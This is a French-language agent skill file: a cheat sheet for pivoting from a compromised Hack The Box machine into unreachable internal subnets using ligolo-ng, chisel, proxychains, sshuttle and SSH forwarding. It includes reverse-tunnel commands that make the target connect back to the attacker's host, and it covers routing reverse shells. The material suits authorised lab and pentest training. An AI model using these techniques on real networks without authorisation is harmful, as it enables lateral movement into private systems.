---
name: htb-pivoting
description: >
  Pivoting et tunneling vers des réseaux internes non routables sur un lab HTB
  (Pro Labs, multi-machines) ou environnement autorisé. À déclencher quand une
  machine compromise donne accès à un sous-réseau que votre hôte d'attaque ne
  peut pas joindre directement. Couvre : ligolo-ng, chisel, proxychains, sshuttle,
  et le port forwarding SSH. Produit une route/proxy vers le réseau interne pour
  y relancer scans et exploits.
metadata:
  type: reference
  category: pivoting
  legal: "Cibles autorisées uniquement (HTB, labs, CTF, systèmes vous appartenant)."
---

# HTB — Pivoting & tunneling

## Quand utiliser cette skill
Une box compromise (« foothold ») a une seconde interface vers un réseau interne
(ex. `172.16.x.x`) que vous ne pouvez pas atteindre depuis `tun0`. Il faut
tunneliser votre trafic à travers elle.

## Option A — ligolo-ng (recommandé, le plus simple)
```bash
# 1) Chez vous : interface tun + proxy
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert          # note le port d'écoute (11601)

# 2) Sur la cible : lancer l'agent (transféré via htb-shells)
./agent -connect VOTRE_IP_tun0:11601 -ignore-cert     # Linux
#  .\agent.exe -connect ... (Windows)

# 3) Dans la console ligolo : sélectionner la session puis
#    session   -> choisir l'agent
#    ifconfig  -> voir le sous-réseau interne
# 4) Chez vous : router le sous-réseau via l'interface ligolo
sudo ip route add 172.16.1.0/24 dev ligolo
#    puis dans ligolo :  start
```
Ensuite, `nmap 172.16.1.5` fonctionne directement (pas besoin de proxychains).

## Option B — chisel (SOCKS proxy)
```bash
# Chez vous (serveur)
chisel server -p 8000 --reverse
# Sur la cible (client -> reverse SOCKS)
./chisel client VOTRE_IP:8000 R:socks
# Chez vous : router les outils via le proxy 127.0.0.1:1080
# /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.1.5
proxychains netexec smb 172.16.1.0/24
```

## Option C — SSH (si vous avez des creds SSH sur le pivot)
```bash
# Dynamic port forward (SOCKS)
ssh -D 1080 user@PIVOT     # puis proxychains
# Local port forward (un service précis)
ssh -L 8080:172.16.1.5:80 user@PIVOT   # 127.0.0.1:8080 -> service interne
# sshuttle (VPN-like, transparent)
sshuttle -r user@PIVOT 172.16.1.0/24
```

## Réflexes
- **proxychains** ne gère bien que le TCP connect ; avec nmap utiliser `-sT -Pn`
  (pas de scan SYN/UDP à travers un SOCKS).
- ligolo évite proxychains : plus fiable pour scans complets et reverse shells.
- Pour un reverse shell depuis une box interne, ajouter un *listener* côté ligolo
  (`listener_add`) qui renvoie vers votre `tun0`.
- Documenter la topologie (quelle box voit quel réseau) au fur et à mesure.
